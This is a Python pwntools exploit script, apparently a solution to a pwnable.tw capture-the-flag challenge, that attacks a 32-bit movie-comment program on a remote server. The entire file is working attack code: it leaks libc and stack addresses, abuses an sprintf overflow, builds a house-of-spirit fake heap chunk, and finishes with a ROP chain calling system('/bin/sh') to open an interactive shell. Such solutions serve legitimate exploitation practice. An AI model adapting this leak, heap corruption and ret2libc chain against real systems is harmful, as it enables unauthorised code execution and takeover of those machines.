from pwn import *

io = remote('chall.pwnable.tw', 10204)

libc = ELF('./libc_32.so.6')

def comment1(name, age, reason, comment, yn):
	io.recvuntil('Please enter your name: ')
	io.send(name)
	io.recvuntil('Please enter your age: ')
	io.sendline(str(age))
	io.recvuntil('Why did you came to see this movie? ')
	io.send(reason)
	io.recvuntil('Please enter your comment: ')
	io.send(comment)

	io.recvuntil('Name: ')
	name = io.recvline(keepends = False)
	io.recvuntil('Age: ')
	age = int(io.recvlineS(keepends = False))
	io.recvuntil('Reason: ')
	reason = io.recvline(keepends = False)
	io.recvuntil('Comment: ')
	comment = io.recvline(keepends = False)

	io.recvuntil('Would you like to leave another comment? <y/n>: ')
	io.send(yn)
		
	return name, age, reason, comment

def comment2(age, reason, yn):
	io.recvuntil('Please enter your age: ')
	io.sendline(str(age))
	io.recvuntil('Why did you came to see this movie? ')
	io.send(reason)
	io.recvuntil('Would you like to leave another comment? <y/n>: ')
	io.send(yn)
		
# leak libc and stack address
_, _, leak, _ = comment1('A', 20, 'A' * 80, 'A', 'y')
old_ebp = u32(leak[80:84])
fake_chunk = old_ebp - 0x68
fake_size = (0x1000 - ((fake_chunk + 0x30) & 0xfff)) | 1
libc.address = u32(leak[88:92]) - libc.sym['_IO_2_1_stdout_']

# overflow in sprintf
for _ in range(9):
	comment1('A', 20, 'A' * 80, 'A', 'y')

# nbytes -> 0
for _ in range(90):
	comment2(20, 'A', 'y')

# nbytes -> ord('n')

# house of spirit
comment_payload = b'A' * 0x50 + p32(0) + p32(fake_chunk)
reason_payload = p32(0) + p32(0x41) + p32(0) * 15 + p32(fake_size)

comment1('A', 20, reason_payload, comment_payload, 'y')

# rop gadget
rop = b'A' * 0x48 + p32(old_ebp) + p32(libc.sym['system']) + p32(0) + p32(next(libc.search(b'/bin/sh')))
comment1(rop, 20, 'A', 'A', 'n')

io.interactive()
